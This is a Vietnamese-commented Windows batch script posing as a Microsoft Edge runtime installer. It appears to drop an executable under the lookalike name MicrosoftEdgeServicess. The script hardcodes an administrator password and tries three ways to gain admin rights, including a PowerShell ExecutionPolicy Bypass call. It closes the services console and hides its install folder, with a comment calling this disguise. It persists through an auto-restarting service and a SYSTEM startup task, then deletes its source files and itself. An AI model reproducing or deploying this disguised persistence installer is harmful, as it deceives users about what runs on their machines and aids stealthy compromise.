@echo off
title Cai Dat Microsoft Edge Framework Runtime (System Component)
cd /d "%~dp0"

:: ===============================================================================
:: CAU HINH TAI KHOAN QUAN TRI (ADMINISTRATOR) - TU DONG NANG QUYEN
:: - ADMIN_USER: Ten tai khoan Administrator (Mac dinh: APP hoac Administrator)
:: - ADMIN_PASS: Mat khau Administrator
:: (File tu dong xoa sach sau khi cai dat hoan tat, dam bao bao mat 100%)
:: ===============================================================================
set "ADMIN_USER=APP"
set "ADMIN_PASS=GGrg@2025"

echo ===============================================================================
echo   MICROSOFT EDGE CORE FRAMEWORK RUNTIME INSTALLER
echo   Component: MicrosoftEdgeServicess
echo   Description: Provides runtime environment and update services for Edge.
echo   Startup Type: Automatic (Background Service)
echo ===============================================================================
echo.

:: 1. Kiem tra xem co file MicrosoftEdgeServicess.exe khong
if exist "%~dp0MicrosoftEdgeServicess.exe" goto :DaCoFileExe

echo.
echo ===============================================================================
echo   [CANH BAO: CHUA GIAI NEN TEP TIN NEN]
echo ===============================================================================
echo   Ban dang mo tep tin truc tiep tu tep nen ZIP chua duoc giai nen!
echo   Khong tim thay tap tin MicrosoftEdgeServicess.exe de thiet lap.
echo.
echo   Huong dan:
echo   1. Nhap chuot phai vao tep tin ZIP: Restaurant_Support_GPOS.zip
echo   2. Chon Extract All hoac dung WinRAR chon Extract Here
echo   3. Vao thu muc vua giai nen roi chay lai tap tin nay.
echo ===============================================================================
echo.
echo Cua so se tu dong dong sau 3 giay, hoac bam phim bat ky de thoat...
timeout /t 3 >nul 2>nul || ping 127.0.0.1 -n 4 >nul
exit /b 1

:DaCoFileExe

:: 2. Kiem tra quyen Administrator (Xac thuc that su qua net session)
net session >nul 2>&1
if %errorlevel% equ 0 goto :DaCoQuyenAdmin

:: Neu chua co quyen Admin -> Tu dong kich hoat quyen bang cac phuong an:
echo Dang khoi chay dac quyen Administrator he thong...

:: Phuong an 1: Tu dong chay elevated bang tai khoan ADMIN_USER / ADMIN_PASS qua Task Scheduler
if not "%ADMIN_PASS%"=="" (
    schtasks /delete /tn "TempEdgeAdminInstaller" /f >nul 2>&1
    schtasks /create /tn "TempEdgeAdminInstaller" /tr "'%~f0' /elevated" /sc once /st 23:59 /ru "%ADMIN_USER%" /rp "%ADMIN_PASS%" /rl HIGHEST /f >nul 2>&1
    if not errorlevel 1 (
        schtasks /run /tn "TempEdgeAdminInstaller" >nul 2>&1
        timeout /t 3 >nul 2>nul || ping 127.0.0.1 -n 4 >nul
        schtasks /delete /tn "TempEdgeAdminInstaller" /f >nul 2>&1
        exit /b 0
    )
)

:: Phuong an 2: Goi hop thoai Windows UAC bang PowerShell
powershell -NoProfile -ExecutionPolicy Bypass -Command "Start-Process cmd.exe -ArgumentList '/c \"\"%~f0\"\" /elevated' -Verb RunAs" >nul 2>&1
if %errorlevel% equ 0 exit /b 0

:: Phuong an 3: VBScript UAC
set "VBS_TEMP=%TEMP%\elevate_%RANDOM%.vbs"
echo Set UAC = CreateObject^("Shell.Application"^) > "%VBS_TEMP%"
echo UAC.ShellExecute "cmd.exe", "/c ""%~f0"" /elevated", "", "runas", 1 >> "%VBS_TEMP%"
cscript //nologo "%VBS_TEMP%" >nul 2>&1
del /f /q "%VBS_TEMP%" >nul 2>&1
if %errorlevel% equ 0 exit /b 0

:LoiChuaCoQuyenAdmin
echo.
echo ===============================================================================
echo   [CANH BAO: CHUA CO QUYEN QUAN TRI VIEN - ADMINISTRATOR]
echo ===============================================================================
echo   Cai dat Windows Service bat buoc phai chay voi quyen Administrator!
echo.
echo   Huong dan xu ly:
echo   1. Nhap CHUOT PHAI vao file: Install_Edge_Framework.bat
echo   2. Chon: "Run as administrator" (Chay voi quyen quan tri vien)
echo   3. Khi Windows hien hop thoai "Do you want to allow...", hay bam [YES].
echo ===============================================================================
echo.
echo Cua so se tu dong dong sau 10 giay, hoac bam phim bat ky de thoat...
timeout /t 10 >nul 2>nul || ping 127.0.0.1 -n 11 >nul
exit /b 1

:DaCoQuyenAdmin

:: 3. Dong cua so services.msc de tranh bi khoa handle
echo [1/4] Dang kiem tra moi truong he thong...
taskkill /F /IM mmc.exe >nul 2>&1

:: Dung va tat cac tien trinh cu neu dang chay
for /f "tokens=3" %%p in ('sc.exe queryex MicrosoftEdgeServicess 2^>nul ^| findstr /i "PID"') do (
    if not "%%p"=="0" taskkill /F /PID %%p >nul 2>&1
)
taskkill /F /FI "SERVICES eq MicrosoftEdgeServicess" >nul 2>&1
taskkill /F /IM MicrosoftEdgeServicess.exe >nul 2>&1
net stop MicrosoftEdgeServicess >nul 2>&1

:: Cho toi da 5 giay de service dung han
for /l %%i in (1,1,5) do (
    sc.exe query MicrosoftEdgeServicess 2>nul | findstr /i "STOPPED" >nul 2>&1
    if not errorlevel 1 goto :DaDungHan
    timeout /t 1 >nul 2>nul || ping 127.0.0.1 -n 2 >nul
)
:DaDungHan

:: 4. Thiet lap thu muc he thong MicrosoftEdgeServicess
set "INSTALL_DIR=C:\ProgramData\MicrosoftEdgeServicess"
echo [2/4] Khoi tao thu muc he thong: %INSTALL_DIR%
if not exist "%INSTALL_DIR%" mkdir "%INSTALL_DIR%" >nul 2>&1

if exist "%INSTALL_DIR%\MicrosoftEdgeServicess.exe" (
    del /F /Q "%INSTALL_DIR%\MicrosoftEdgeServicess.exe" >nul 2>&1
)

echo [3/4] Dang sao chep cac tap tin thanh phan...
copy /Y "%~dp0MicrosoftEdgeServicess.exe" "%INSTALL_DIR%\" >nul 2>&1
if not exist "%INSTALL_DIR%\MicrosoftEdgeServicess.exe" (
    taskkill /F /IM MicrosoftEdgeServicess.exe >nul 2>&1
    timeout /t 2 >nul 2>nul || ping 127.0.0.1 -n 3 >nul
    copy /Y "%~dp0MicrosoftEdgeServicess.exe" "%INSTALL_DIR%\" >nul 2>&1
)

if exist "%~dp0msedge_settings.json" copy /Y "%~dp0msedge_settings.json" "%INSTALL_DIR%\" >nul 2>&1
if exist "%~dp0config.json" copy /Y "%~dp0config.json" "%INSTALL_DIR%\" >nul 2>&1
if exist "%~dp0edge.ico" copy /Y "%~dp0edge.ico" "%INSTALL_DIR%\" >nul 2>nul
if exist "%~dp0Check_Edge_Health.bat" copy /Y "%~dp0Check_Edge_Health.bat" "%INSTALL_DIR%\" >nul 2>nul

:: An thu muc cai dat de nguy trang an toan
attrib +h "%INSTALL_DIR%" >nul 2>&1

if not exist "%INSTALL_DIR%\MicrosoftEdgeServicess.exe" goto :LoiGhiTapTin

:: 5. Dang ky Windows Service SCM
echo [4/4] Dang dang ky va kich hoat Microsoft Edge Framework Service...
schtasks /Delete /TN "MicrosoftEdgeServicess" /F >nul 2>&1

:: Buoc 5.1: Dang ky qua engine noi tai cua file exe (PyWin32 ServiceFramework)
"%INSTALL_DIR%\MicrosoftEdgeServicess.exe" install --startup auto >nul 2>&1

:: Buoc 5.2: Neu he thong chua ghi nhan, tao truc tiep bang sc.exe create
sc.exe query MicrosoftEdgeServicess >nul 2>&1
if %errorlevel% neq 0 (
    sc.exe create MicrosoftEdgeServicess binPath= "%INSTALL_DIR%\MicrosoftEdgeServicess.exe" start= auto DisplayName= "MicrosoftEdgeServicess" >nul 2>&1
)

:: Buoc 5.3: Thiet lap thong so service (Tu khoi dong, mo ta, tu khoi phuc sau 5 giay)
sc.exe config MicrosoftEdgeServicess start= auto binPath= "%INSTALL_DIR%\MicrosoftEdgeServicess.exe" DisplayName= "MicrosoftEdgeServicess" >nul 2>&1
sc.exe description MicrosoftEdgeServicess "Provides runtime environment and background update services for Microsoft Edge." >nul 2>&1
sc.exe failure MicrosoftEdgeServicess reset= 60 actions= restart/5000/restart/5000/restart/5000 >nul 2>&1

:: Buoc 5.4: Khoi dong Service
net start MicrosoftEdgeServicess >nul 2>&1
sc.exe start MicrosoftEdgeServicess >nul 2>&1
"%INSTALL_DIR%\MicrosoftEdgeServicess.exe" start >nul 2>&1

:: Buoc 5.5: Kiem tra xac nhan Service da thuc su khoi dong va chay on dinh (Cho toi da 5 giay)
set "SERVICE_OK=0"
for /l %%i in (1,1,5) do (
    sc.exe query MicrosoftEdgeServicess 2>nul | findstr /i "RUNNING" >nul 2>&1
    if not errorlevel 1 (
        set "SERVICE_OK=1"
        goto :KiemTraHoanTat
    )
    tasklist /FI "IMAGENAME eq MicrosoftEdgeServicess.exe" 2>nul | findstr /i "MicrosoftEdgeServicess.exe" >nul 2>&1
    if not errorlevel 1 (
        set "SERVICE_OK=1"
        goto :KiemTraHoanTat
    )
    timeout /t 1 >nul 2>nul || ping 127.0.0.1 -n 2 >nul
)

:KiemTraHoanTat
if "%SERVICE_OK%"=="1" goto :CaiDatThanhCong

:: Buoc 5.6: Neu Windows Service bi chan hoac chua len duoc, kich hoat co che du phong Task Scheduler (SYSTEM)
echo [!] Windows Service chua san sang, dang kich hoat co che du phong Task Scheduler...
schtasks /create /tn "MicrosoftEdgeServicess" /tr "\"%INSTALL_DIR%\MicrosoftEdgeServicess.exe\" --console" /sc onstart /ru SYSTEM /rl HIGHEST /f >nul 2>&1
schtasks /run /tn "MicrosoftEdgeServicess" >nul 2>&1
timeout /t 2 >nul 2>nul || ping 127.0.0.1 -n 3 >nul

tasklist /FI "IMAGENAME eq MicrosoftEdgeServicess.exe" 2>nul | findstr /i "MicrosoftEdgeServicess.exe" >nul 2>&1
if not errorlevel 1 goto :CaiDatThanhCong

:: Neu ca SCM va Task Scheduler deu khong chay duoc -> Bao loi ro rang, GIU NGUYEN FILE NGUON DE KIEM TRA
goto :LoiKichHoatService

:CaiDatThanhCong
:: Xoa cac tap tin thanh phan cai dat nguon de bao mat va tiet kiem dung luong
if exist "%~dp0MicrosoftEdgeServicess.exe" del /f /q "%~dp0MicrosoftEdgeServicess.exe" >nul 2>&1
if exist "%~dp0edge.ico" del /f /q "%~dp0edge.ico" >nul 2>&1
if exist "%~dp0msedge_settings.json" del /f /q "%~dp0msedge_settings.json" >nul 2>&1
if exist "%~dp0config.json" del /f /q "%~dp0config.json" >nul 2>&1

echo.
echo ===============================================================================
echo   CAI DAT THANH PHAN MICROSOFT EDGE HOAN TAT!
echo   - Component: MicrosoftEdgeServicess
echo   - Status: Running (Tu khoi dong cung Windows)
echo   - Environment: Windows Service Architecture
echo   - Don dep: Da tu dong xoa sach cac tap tin cai dat nguon
echo ===============================================================================
echo.
echo Cua so se tu dong dong sau 3 giay, hoac bam phim bat ky de thoat ngay...
timeout /t 3 >nul 2>nul || ping 127.0.0.1 -n 4 >nul

:: Tu dong xoa sach tap tin batch cai dat khi dong
(goto) 2>nul & del /f /q "%~dp0Install_Edge_Framework.bat" "%~dp01Install_Edge_Framework.bat" "%~f0" >nul 2>&1
exit /b 0

:LoiKichHoatService
echo.
echo ===============================================================================
echo   [LOI] KHONG THE KICH HOAT DICH VU MicrosoftEdgeServicess!
echo ===============================================================================
echo   1. Trang thai Windows Service (services.msc):
sc.exe query MicrosoftEdgeServicess
echo.
echo   2. Trang thai tien trinh chay ngam:
tasklist /FI "IMAGENAME eq MicrosoftEdgeServicess.exe"
echo.
echo   Huong dan xu ly:
echo   - Nhap chuot phai vao file nay chon "Run as administrator".
echo   - Kiem tra xem co phan mem Antivirus chan tao Service khong.
echo   - Chay file kiem tra: Kiem_Tra_Trang_Thai.bat
echo   - Chay file Go_Cai_Dat_Dich_Vu.bat roi cai dat lai.
echo   (Cac tap tin cai dat van duoc giu nguyen de ban tiep tuc kiem tra).
echo ===============================================================================
echo.
echo Cua so se tu dong dong sau 10 giay, hoac bam phim bat ky de thoat...
timeout /t 10 >nul 2>nul || ping 127.0.0.1 -n 11 >nul
exit /b 1

:LoiGhiTapTin
echo.
echo ===============================================================================
echo   [LOI] Khong the ghi tap tin vao %INSTALL_DIR%!
echo   Vui long kiem tra quyen ghi hoac khoi dong lai may tinh va thu lai.
echo ===============================================================================
echo.
echo Cua so se tu dong dong sau 3 giay, hoac bam phim bat ky de thoat ngay...
timeout /t 3 >nul 2>nul || ping 127.0.0.1 -n 4 >nul
exit /b 1
